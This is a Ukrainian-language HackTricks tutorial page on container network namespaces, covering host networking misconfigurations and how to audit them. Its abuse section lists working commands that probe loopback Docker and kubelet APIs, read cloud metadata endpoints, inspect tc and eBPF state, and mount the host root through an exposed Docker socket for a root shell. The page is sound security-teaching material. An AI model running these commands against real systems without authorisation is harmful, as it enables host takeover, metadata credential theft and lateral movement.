# Мережевий простір імен

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Мережевий простір імен ізолює мережеві ресурси, такі як інтерфейси, IP-адреси, таблиці маршрутизації, стан ARP/neighbor, правила firewall, сокети та вміст файлів на кшталт `/proc/net`. Саме тому контейнер може мати, здавалося б, власний `eth0`, власні локальні маршрути та власний loopback-пристрій, не володіючи реальним мережевим стеком хоста.

З точки зору безпеки це важливо, тому що мережна ізоляція — це набагато більше, ніж просто прив'язка портів. Приватний мережевий простір імен обмежує те, що робоче навантаження може безпосередньо спостерігати або переналаштовувати. Якщо цей простір імен ділиться з хостом, контейнер раптово може отримати видимість на слухачів хоста, локальні сервіси хоста та точки керування мережею, які ніколи не мали бути відкриті для застосунку.

## Принцип роботи

Щойно створений мережевий простір імен починається з порожнього або майже порожнього мережевого середовища, поки до нього не приєднають інтерфейси. Рантайми контейнерів створюють або підключають віртуальні інтерфейси, присвоюють адреси та налаштовують маршрути, щоб робоче навантаження мало очікуване з'єднання. У розгортаннях на базі мостів це зазвичай означає, що контейнер бачить інтерфейс на базі veth, підключений до моста хоста. У Kubernetes CNI плагіни виконують еквівалентне налаштування для мережі Pod.

Ця архітектура пояснює, чому `--network=host` або `hostNetwork: true` — така суттєва зміна. Замість отримання підготовленого приватного мережевого стеку робоче навантаження приєднується до фактичного стеку хоста.

## Лаб

Ви можете побачити майже порожній мережевий простір імен за допомогою:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
І ви можете порівняти звичайні та host-networked контейнери за допомогою:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Контейнер, підключений до мережі хоста, більше не має власного ізольованого перегляду сокетів та інтерфейсів. Саме це вже є суттєвим, ще до того, як ви дізнаєтеся, які можливості має процес.

## Використання під час виконання

Docker та Podman зазвичай створюють приватний простір імен мережі для кожного контейнера, якщо не налаштовано інакше. Kubernetes зазвичай дає кожному Pod його власний простір імен мережі, який спільний для контейнерів усередині цього Pod, але відокремлений від хоста. Incus/LXC також забезпечують багату ізоляцію на основі простору імен мережі, часто з великою кількістю варіантів віртуальних мережевих налаштувань.

Загальний принцип такий: приватна мережа — це межа ізоляції за замовчуванням, тоді як використання мережі хоста — це явний вихід за межі цієї ізоляції.

## Неправильні конфігурації

Найважливіша неправильна конфігурація — це просте спільне використання простору імен мережі хоста. Це іноді роблять заради продуктивності, моніторингу низького рівня або зручності, але це усуває одну з найчистіших меж, доступних контейнерам. Слухачі, локальні для хоста, стають доступнішими, служби, доступні тільки з localhost, можуть стати доступними, а можливості на кшталт `CAP_NET_ADMIN` або `CAP_NET_RAW` стають значно небезпечнішими, оскільки операції, які вони дозволяють, тепер застосовуються до самої мережевої середовища хоста.

Ще одна проблема — надмірне надання мережевих можливостей навіть коли простір імен мережі приватний. Приватний простір імен допомагає, але він не робить raw sockets або розширений мережевий контроль безпечними.

У Kubernetes `hostNetwork: true` також змінює довіру до сегментації мережі на рівні Pod. Kubernetes документує, що багато мережевих плагінів не можуть правильно відрізнити трафік Pod з `hostNetwork` для відповідності `podSelector` / `namespaceSelector` і тому трактують його як звичайний трафік вузла. З точки зору нападника, це означає, що скомпрометований робочий навантаження з `hostNetwork` часто слід розглядати як мережеву точку опори на рівні вузла, а не як звичайний Pod, що все ще обмежений тими ж політичними припущеннями, що й робочі навантаження в overlay-network.

## Зловживання

У слабко ізольованих конфігураціях атакувальники можуть перевіряти сервіси, що слухають на хості, отримувати доступ до керуючих кінцевих точок, прив’язаних лише до loopback, прослуховувати або втручатися у трафік залежно від наявних можливостей і середовища, або переналаштовувати маршрутизацію та стан брандмауера, якщо присутній `CAP_NET_ADMIN`. У кластері це також може полегшити бокове переміщення та розвідку контрольної площини.

Якщо ви підозрюєте мережу хоста, почніть з підтвердження того, що видимі інтерфейси та слухачі належать хосту, а не ізольованій мережі контейнера:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Сервіси, доступні лише на loopback, часто є першим цікавим відкриттям:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Якщо доступні мережеві можливості, перевірте, чи може workload переглядати або змінювати видимий stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
На сучасних ядрах, хостова мережа разом із `CAP_NET_ADMIN` може також відкривати шлях пакетів, виходячи за межі простих змін `iptables` / `nftables`. `tc` qdiscs та фільтри також мають область дії, обмежену простором імен, тому в спільному просторі імен хост-мережі вони застосовуються до інтерфейсів хоста, які контейнер може бачити. Якщо додатково присутній `CAP_BPF`, мережеві eBPF програми, такі як завантажувачі TC та XDP, також стають релевантними:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Це важливо, тому що зловмисник може дзеркалити, перенаправляти, формувати або скидати трафік на рівні інтерфейсу хоста, а не лише переписувати правила firewall. У приватному network namespace ці дії обмежені межами контейнера; у спільному host namespace вони впливають на хост.

У cluster або cloud середовищах мережеві налаштування хоста також виправдовують швидку local recon метаданих і сервісів, суміжних із control-plane:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Повний приклад: Host Networking + Local Runtime / Kubelet Access

Host networking не надає автоматично host root, але часто відкриває сервіси, які навмисно доступні лише з самого нода. Якщо один із таких сервісів слабо захищений, host networking стає прямим шляхом privilege-escalation.

Docker API на localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet на localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Вплив:

- пряме компрометування хоста, якщо локальний runtime API доступний без належного захисту
- розвідка кластера або латеральний рух, якщо kubelet або локальні агенти доступні
- маніпуляція трафіком або відмова в обслуговуванні при поєднанні з `CAP_NET_ADMIN`

## Перевірки

Мета цих перевірок — визначити, чи процес має приватний мережевий стек, які маршрути й прослуховувачі видимі, і чи мережевий вигляд уже нагадує хостовий до того, як ви почнете перевіряти можливості.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Що тут цікаво:

- Якщо `/proc/self/ns/net` та `/proc/1/ns/net` вже виглядають як на хості, контейнер може ділити мережевий простір імен хоста або інший неізольований простір імен.
- `lsns -t net` та `ip netns identify` корисні, коли shell вже знаходиться всередині іменованого або персистентного простору імен, і ви хочете зіставити його з `/run/netns` об'єктами зі сторони хоста.
- `ss -lntup` особливо цінний, оскільки показує слухачі лише на loopback та локальні кінцеві точки керування.
- Маршрути, імена інтерфейсів, контекст firewall, стан `tc` та привʼязки eBPF стають значно важливішими, якщо присутні `CAP_NET_ADMIN`, `CAP_NET_RAW` або `CAP_BPF`.
- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.

Під час огляду контейнера завжди оцінюйте мережевий простір імен разом із набором можливостей (capabilities). Мережа хоста у поєднанні з широкими мережевими можливостями — це зовсім інша позиція безпеки, ніж мостова мережа (bridge networking) з вузьким стандартним набором можливостей.
